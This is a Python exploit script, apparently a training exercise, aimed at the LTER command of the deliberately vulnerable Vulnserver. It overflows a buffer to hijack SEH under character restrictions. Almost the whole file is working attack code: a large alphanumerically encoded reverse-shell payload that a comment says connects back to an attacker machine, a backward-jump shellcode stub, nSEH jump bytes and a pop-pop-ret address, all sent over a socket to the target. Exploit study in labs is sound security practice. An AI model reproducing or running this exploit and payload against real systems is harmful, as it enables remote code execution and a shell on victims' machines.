#LTER Vulnserver Exploit
#Written by Elias Augusto
#SEH+Character Restrictions
from socket import *

s=socket(AF_INET,SOCK_STREAM)
s.connect(('192.168.1.1',9999))

#What spike put before our A's
buffer="LTER /.../"

#Total Buffer length after /.../ is 5000
#Offset is 3518 - 4 for NSEH

#Now we attempt to find our badchar free buffer
#Encoded Reverse Shell, 2122 bytes. Our attacker machine was 192.168.100.39
buffer+="\x54\x58\x66\x2d\x55\x77\x66\x2d\x55\x7F\x66\x2d\x55\x0B\x50\x5c\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x40\x21\x39\x78\x2d\x4a\x5f\x4f\x6a\x2d\x76\x2c\x78\x47\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x40\x41\x28\x24\x2d\x40\x21\x28\x4f\x2d\x6d\x2b\x40\x22\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x22\x62\x7f\x4f\x2d\x40\x4b\x61\x2a\x2d\x29\x4d\x64\x3e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x40\x28\x52\x40\x2d\x40\x29\x79\x63\x2d\x76\x2e\x39\x7b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x40\x41\x2d\x30\x2d\x6f\x41\x4f\x30\x2d\x7c\x40\x7d\x23\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x70\x61\x7b\x64\x2d\x7c\x70\x6b\x24\x2d\x7f\x70\x7b\x77\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7f\x50\x43\x5e\x2d\x60\x31\x24\x7c\x2d\x7f\x27\x30\x7f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x78\x7a\x30\x7f\x2d\x60\x4a\x64\x6b\x2d\x53\x7f\x7a\x5f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x21\x21\x24\x5e\x2d\x30\x42\x40\x23\x2d\x28\x7f\x3b\x7f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5e\x70\x41\x40\x2d\x28\x34\x23\x56\x2d\x7b\x2a\x33\x61\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x70\x38\x43\x39\x2d\x40\x3c\x41\x4f\x2d\x70\x3c\x25\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x29\x38\x38\x21\x2d\x30\x4f\x7a\x22\x2d\x21\x79\x77\x32\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x40\x23\x4f\x38\x2d\x30\x40\x74\x28\x2d\x28\x23\x70\x5f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x40\x36\x40\x28\x2d\x41\x52\x40\x58\x2d\x29\x21\x2c\x29\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x28\x29\x30\x41\x2d\x40\x24\x49\x26\x2d\x42\x6c\x30\x4a\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x41\x48\x21\x4c\x2d\x40\x41\x48\x21\x2d\x2b\x26\x40\x3c\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3e\x7f\x72\x50\x2d\x38\x3d\x2c\x2a\x2d\x7a\x7d\x60\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x70\x30\x2a\x5e\x2d\x30\x21\x5a\x3b\x2d\x5f\x21\x37\x42\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x40\x68\x58\x40\x2d\x40\x35\x28\x7b\x2d\x3c\x3e\x43\x43\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6b\x61\x30\x7f\x2d\x35\x60\x3c\x3b\x2d\x7e\x40\x2c\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4f\x43\x49\x4f\x2d\x22\x2b\x2a\x2a\x2d\x25\x7f\x33\x30\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x21\x40\x27\x62\x2d\x41\x28\x39\x6c\x2d\x47\x40\x6e\x3b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x75\x2c\x71\x42\x2d\x40\x24\x79\x28\x2d\x4b\x26\x32\x3d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x21\x29\x30\x28\x2d\x21\x4f\x2a\x28\x2d\x56\x24\x38\x4b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x68\x40\x66\x40\x2d\x78\x28\x5a\x6a\x2d\x7e\x40\x40\x7f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x43\x30\x78\x70\x2d\x59\x25\x4a\x60\x2d\x78\x41\x4d\x79\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7c\x22\x21\x34\x2d\x40\x63\x71\x25\x2d\x45\x2b\x65\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7f\x70\x28\x6a\x2d\x7d\x65\x3b\x30\x2d\x7f\x69\x27\x59\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x29\x23\x5a\x70\x2d\x40\x5a\x66\x54\x2d\x23\x21\x40\x65\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x44\x21\x76\x7f\x2d\x42\x21\x7a\x5b\x2d\x23\x55\x76\x7f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6b\x30\x21\x53\x2d\x40\x24\x62\x22\x2d\x6f\x40\x6c\x34\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7c\x56\x70\x22\x2d\x24\x55\x72\x22\x2d\x60\x53\x62\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x24\x3e\x38\x68\x2d\x21\x2a\x38\x3c\x2d\x57\x70\x27\x59\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6a\x33\x6f\x7f\x2d\x40\x22\x6f\x5f\x2d\x51\x42\x61\x78\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x61\x4b\x24\x24\x2d\x40\x5f\x22\x41\x2d\x60\x7f\x21\x30\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6d\x3d\x28\x33\x2d\x45\x34\x7c\x6f\x2d\x64\x7e\x7c\x7c\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x40\x3e\x3d\x3d\x2d\x4f\x59\x51\x2c\x2d\x21\x28\x21\x2e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x40\x4e\x3e\x21\x2d\x4f\x21\x30\x53\x2d\x21\x40\x41\x4b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x61\x4f\x70\x2d\x2d\x21\x49\x5a\x4f\x2d\x7e\x68\x5f\x32\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x22\x40\x22\x30\x2d\x40\x4f\x21\x24\x2d\x36\x47\x3c\x40\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x31\x58\x40\x22\x2d\x60\x79\x43\x43\x2d\x46\x6a\x27\x4a\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x21\x5f\x60\x65\x2d\x21\x6f\x3c\x29\x2d\x2e\x30\x63\x71\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f\x41\x2c\x7f\x2d\x40\x6a\x7f\x48\x2d\x5a\x55\x7e\x7f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2d\x43\x21\x22\x2d\x40\x40\x41\x4f\x2d\x2b\x30\x26\x68\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x21\x40\x28\x30\x2d\x40\x2d\x40\x59\x2d\x2c\x60\x38\x22\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x28\x5c\x2d\x21\x2d\x68\x25\x2d\x40\x2d\x70\x7e\x3d\x27\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x61\x26\x27\x2c\x2d\x21\x2a\x61\x39\x2d\x21\x47\x44\x68\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x24\x3e\x48\x7f\x2d\x2c\x37\x5c\x75\x2d\x25\x78\x70\x7d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7f\x40\x33\x3d\x2d\x40\x27\x2d\x27\x2d\x61\x38\x40\x41\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x25\x2a\x40\x7f\x2d\x4f\x3d\x40\x21\x2d\x33\x3e\x2e\x60\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3c\x22\x21\x28\x2d\x40\x22\x23\x48\x2d\x60\x60\x60\x2e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6f\x77\x6f\x60\x2d\x7a\x7f\x28\x2c\x2d\x47\x7f\x23\x4f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x27\x3e\x2e\x5d\x2d\x23\x3e\x22\x22\x2d\x2b\x7f\x24\x7f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x40\x48\x63\x7b\x2d\x30\x22\x3b\x45\x2d\x38\x79\x60\x6c\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7f\x6f\x3e\x21\x2d\x78\x62\x39\x22\x2d\x7e\x21\x3d\x31\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2d\x5b\x68\x24\x2d\x40\x24\x5e\x40\x2d\x6f\x7f\x66\x34\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x40\x21\x23\x39\x2d\x70\x4e\x21\x4b\x2d\x6c\x37\x30\x23\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x30\x21\x5f\x28\x2d\x40\x40\x3e\x3b\x2d\x55\x21\x3e\x27\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5a\x60\x21\x28\x2d\x70\x22\x40\x6f\x2d\x40\x79\x21\x70\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7c\x41\x4a\x21\x2d\x40\x33\x6b\x46\x2d\x7d\x52\x6a\x22\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x78\x78\x2a\x22\x2d\x50\x58\x49\x7f\x2d\x77\x5f\x7e\x5d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3e\x45\x68\x78\x2d\x70\x2b\x58\x5f\x2d\x7c\x5d\x40\x7b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x79\x2c\x77\x5f\x2d\x7d\x2d\x7f\x37\x2d\x7f\x71\x7e\x67\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x3e\x3e\x6f\x22\x2d\x2d\x7f\x30\x25\x2d\x7d\x5f\x25\x6f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4a\x5d\x7f\x2b\x2d\x55\x50\x7f\x4f\x2d\x60\x7f\x75\x3b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x40\x7d\x40\x42\x2d\x28\x7f\x41\x3e\x2d\x47\x78\x24\x5f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x36\x3b\x56\x7b\x2d\x68\x38\x33\x4d\x2d\x7f\x43\x75\x66\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x21\x23\x3d\x30\x2d\x30\x6d\x64\x30\x2d\x24\x23\x4d\x27\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x25\x7e\x4f\x2a\x2d\x6d\x7e\x31\x35\x2d\x5e\x78\x34\x64\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x4f\x21\x21\x37\x2d\x38\x62\x21\x2b\x2d\x27\x25\x32\x4b\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6f\x6f\x7f\x6f\x2d\x6f\x6f\x7a\x28\x2d\x21\x5a\x23\x75\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x25\x7f\x58\x3c\x2d\x40\x47\x5f\x3e\x2d\x7b\x78\x78\x77\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x28\x2c\x7e\x30\x2d\x28\x24\x22\x30\x2d\x4f\x33\x5d\x73\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2e\x38\x7a\x3e\x2d\x2d\x6f\x7f\x2a\x2d\x74\x59\x59\x5a\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7d\x67\x24\x40\x2d\x25\x79\x6f\x21\x2d\x4f\x68\x21\x78\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7f\x77\x23\x4f\x2d\x28\x7f\x3d\x21\x2d\x45\x7e\x2c\x67\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2b\x42\x21\x25\x2d\x36\x33\x21\x50\x2d\x4d\x7e\x32\x38\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x21\x22\x5f\x79\x2d\x21\x2b\x24\x7f\x2d\x33\x62\x4c\x7c\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x60\x27\x70\x2e\x2d\x40\x27\x57\x4a\x2d\x7b\x7f\x78\x22\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x64\x40\x34\x79\x2d\x40\x4f\x30\x7f\x2d\x5c\x70\x3b\x7e\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x6f\x7f\x2a\x6f\x2d\x40\x27\x2a\x6f\x2d\x55\x70\x28\x21\x50"
buffer+="C"*1274
#78 byte encoded shellcode that jumps backwards to the start of our buffer.
buffer+="\x54\x5e\x54\x58\x66\x2d\x22\x7f\x66\x2d\x22\x70\x66\x2d\x22\x55\x66\x2d\x11\x55\x66\x2d\x02\x55\x50\x5c\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x31\x62\x23\x2d\x2e\x51\x7a\x24\x2d\x7f\x7e\x3c\x27\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x21\x22\x60\x58\x2d\x40\x2e\x79\x4f\x2d\x39\x2e\x60\x79\x50"
buffer+="C"*40
buffer+="\x71\x06\x70\x04" #nSEH
#Instructions: JNO 06 JO 04. Actual flag position doesn't matter, since the jump will be taken either way
buffer+="\x5E\x19\x50\x62" #pop pop ret
buffer+="\x71\xFF" #Jump 128 bytes backwards, overflow flag isn't set at this point, filter translated to 7180 (JNO -128)
buffer+="C"*1474 #Where we put our jump to offset

s.send(buffer)
s.close()
